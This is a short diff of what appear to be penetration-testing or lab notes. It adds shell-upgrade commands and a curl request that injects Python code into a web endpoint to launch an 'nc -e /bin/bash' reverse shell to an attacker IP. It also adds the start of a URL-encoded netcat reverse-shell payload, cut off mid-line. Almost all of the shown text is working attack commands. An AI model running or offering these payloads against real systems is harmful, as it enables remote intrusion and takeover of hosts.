@@ -89,4 +89,9 @@ os.popen("id").read()
 
 ### Upgrade shell
 
-python3 -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+curl -X  post --data "code=os.system('nc -e /bin/bash 192.168.45.162 18000')" http://192.168.175.117:50000/verify
+
+```
+%0Anc%20192.168.118.3%204444%20-e%20%2Fbin%2Fb
